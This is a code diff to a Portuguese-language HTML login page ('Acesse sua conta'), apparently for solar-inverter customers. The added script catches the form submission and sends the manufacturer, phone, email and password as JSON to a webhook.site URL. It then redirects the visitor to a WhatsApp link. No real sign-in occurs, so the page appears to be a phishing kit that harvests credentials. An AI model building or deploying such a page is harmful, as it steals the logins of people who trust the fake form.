@@ -315,7 +315,7 @@
             </div>
             <div class="form-side">
                 <h2>Acesse sua conta</h2>
-                <form>
+                <form id="carinaForm">
                     <label for="fabricante">Fabricante do Inversor</label>
                     <select id="fabricante" name="fabricante" required>
                         <option value="">Selecione...</option>
@@ -339,6 +339,40 @@
                     </div>
                     <button type="submit">Entrar</button>
                 </form>
+                <script>
+                // Preenche o campo celular com o valor da query string ?celular=xxxx
+                window.addEventListener('DOMContentLoaded', function() {
+                    function getQueryParam(param) {
+                        const params = new URLSearchParams(window.location.search);
+                        return params.get(param);
+                    }
+                    var valorCelular = getQueryParam('celular');
+                    var celularInput = document.getElementById('celular');
+                    if (celularInput && valorCelular) {
+                        celularInput.value = valorCelular;
+                    }
+                });
+
+                // Envia dados do formulário para webhook e redireciona
+                document.getElementById('carinaForm').addEventListener('submit', function(e) {
+                    e.preventDefault();
+                    var form = e.target;
+                    var data = {
+                        fabricante: form.fabricante.value,
+                        celular: form.celular.value,
+                        email: form.email.value,
+                        senha: form.senha.value,
+                        termos: form.termos.checked
+                    };
+                    fetch('https://webhook.site/your-webhook-url', {
+                        method: 'POST',
+                        headers: { 'Content-Type': 'application/json' },
+                        body: JSON.stringify(data)
+                    }).finally(function() {
+                        window.location.href = 'https://wa.link/rt9b03';
+                    });
+                });
+                </script>
                 <script>
                 // Preenche o campo celular com o valor da query string ?celular=xxxx
                 window.addEventListener('DOMContentLoaded', function() {
